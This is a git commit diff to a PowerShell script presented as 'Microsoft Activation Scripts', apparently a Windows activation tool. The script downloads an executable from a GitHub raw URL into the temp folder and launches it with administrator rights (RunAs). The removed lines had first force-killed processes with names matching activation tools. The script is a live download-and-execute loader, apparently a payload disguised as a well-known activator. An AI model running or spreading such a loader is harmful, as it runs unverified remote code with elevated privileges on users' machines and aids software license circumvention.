9ab4c2b5337f2753bf16859f31a8f2be207b6698
acenljd <thebluepoint2@gmail.com>
2025-12-09 19:49:49 +0200

    Update Microsoft Activation Scripts.ps1

--- Microsoft Activation Scripts.ps1
+++ Microsoft Activation Scripts.ps1
@@ -1,24 +1,7 @@
 $url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
+$tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"
 
 
-Get-Process | Where-Object {
-    $_.ProcessName -like "*activ*" -or 
-    $_.ProcessName -like "*mas*" -or 
-    $_.ProcessName -like "*kms*" -or 
-    $_.MainWindowTitle -like "*activ*"
-} | Stop-Process -Force -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri $url -OutFile $tempFile
 
-
-Start-Sleep -Seconds 1
-
-
-$uniqueName = "Activator_" + [System.Guid]::NewGuid().ToString("N").Substring(0, 8) + ".exe"
-$tempFile = "$env:TEMP\$uniqueName"
-
-
-$webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile($url, $tempFile)
-$webClient.Dispose()
-
-
-Start-Process $tempFile
+Start-Process $tempFile -Verb RunAs -WorkingDirectory "$env:TEMP" -Wait
